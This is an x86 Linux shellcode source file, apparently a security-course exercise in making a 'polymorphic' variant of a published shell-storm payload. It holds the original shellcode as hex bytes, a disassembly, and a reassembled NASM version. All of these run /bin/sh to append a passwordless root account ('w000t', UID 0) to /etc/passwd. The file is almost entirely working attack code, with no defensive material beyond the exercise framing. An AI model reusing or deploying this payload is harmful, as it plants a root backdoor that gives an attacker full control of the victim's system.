; A6 - Polymorphic Shellcode
; William Moody
; 31.12.2021
; PA-25640
; Original: http://shell-storm.org/shellcode/files/shellcode-543.php

; echo -ne "\xeb\x2a\x5e\x31\xc0\x88\x46\x07\x88\x46\x0a\x88\x46\x47\x89\x76\x49\x8d\x5e\x08\x89\x5e\x4d\x8d\x5e\x0b\x89\x5e\x51\x89\x46\x55\xb0\x0b\x89\xf3\x8d\x4e\x49\x8d\x56\x55\xcd\x80\xe8\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23\x2d\x63\x23\x2f\x62\x69\x6e\x2f\x65\x63\x68\x6f\x20\x77\x30\x30\x30\x74\x3a\x3a\x30\x3a\x30\x3a\x73\x34\x66\x65\x6d\x30\x64\x65\x3a\x2f\x72\x6f\x6f\x74\x3a\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x20\x3e\x3e\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x23\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43\x44\x44\x44\x44" | ndisasm -u -

; 00000000  EB2A              jmp short 0x2c
; 00000002  5E                pop esi
; 00000003  31C0              xor eax,eax
; 00000005  884607            mov [esi+0x7],al
; 00000008  88460A            mov [esi+0xa],al
; 0000000B  884647            mov [esi+0x47],al
; 0000000E  897649            mov [esi+0x49],esi
; 00000011  8D5E08            lea ebx,[esi+0x8]
; 00000014  895E4D            mov [esi+0x4d],ebx
; 00000017  8D5E0B            lea ebx,[esi+0xb]
; 0000001A  895E51            mov [esi+0x51],ebx
; 0000001D  894655            mov [esi+0x55],eax
; 00000020  B00B              mov al,0xb
; 00000022  89F3              mov ebx,esi
; 00000024  8D4E49            lea ecx,[esi+0x49]
; 00000027  8D5655            lea edx,[esi+0x55]
; 0000002A  CD80              int 0x80
; 0000002C  E8D1FFFFFF        call 0x2
; 00000031  2F                das
; 00000032  62696E            bound ebp,[ecx+0x6e]
; 00000035  2F                das
; 00000036  7368              jnc 0xa0
; 00000038  232D63232F62      and ebp,[dword 0x622f2363]
; 0000003E  696E2F6563686F    imul ebp,[esi+0x2f],dword 0x6f686365
; 00000045  207730            and [edi+0x30],dh
; 00000048  3030              xor [eax],dh
; 0000004A  743A              jz 0x86
; 0000004C  3A30              cmp dh,[eax]
; 0000004E  3A30              cmp dh,[eax]
; 00000050  3A7334            cmp dh,[ebx+0x34]
; 00000053  66656D            gs insw
; 00000056  3064653A          xor [ebp+0x3a],ah
; 0000005A  2F                das
; 0000005B  726F              jc 0xcc
; 0000005D  6F                outsd
; 0000005E  743A              jz 0x9a
; 00000060  2F                das
; 00000061  62696E            bound ebp,[ecx+0x6e]
; 00000064  2F                das
; 00000065  626173            bound esp,[ecx+0x73]
; 00000068  68203E3E20        push dword 0x203e3e20
; 0000006D  2F                das
; 0000006E  657463            gs jz 0xd4
; 00000071  2F                das
; 00000072  7061              jo 0xd5
; 00000074  7373              jnc 0xe9
; 00000076  7764              ja 0xdc
; 00000078  234141            and eax,[ecx+0x41]
; 0000007B  41                inc ecx
; 0000007C  41                inc ecx
; 0000007D  42                inc edx
; 0000007E  42                inc edx
; 0000007F  42                inc edx
; 00000080  42                inc edx
; 00000081  43                inc ebx
; 00000082  43                inc ebx
; 00000083  43                inc ebx
; 00000084  43                inc ebx
; 00000085  44                inc esp
; 00000086  44                inc esp
; 00000087  44                inc esp
; 00000088  44                inc esp

global _start
section .text
_start:
	jmp call_func

func:
	pop esi

	xor eax, eax
	mov [esi + 0x7], al
	mov [esi + 0xa], al
	mov [esi + 0x47], al
	mov [esi + 0x49], al
	mov [esi + 0x49], esi

	lea ebx, [esi + 0x8]
	mov [esi + 0x4d], ebx
	lea ebx, [esi + 0xb]
	mov [esi + 0x51], ebx
	mov [esi + 0x55], eax

	mov al, 0xb
	mov ebx, esi
	lea ecx, [esi + 0x49]
	lea edx, [esi + 0x55]

	int 0x80

call_func:
	call func
	filename: db "/bin/sh#-c#/bin/echo w000t::0:0:s4fem0de:/root:/bin/bash >> /etc/passwd#AAAABBBBCCCCDDDD"
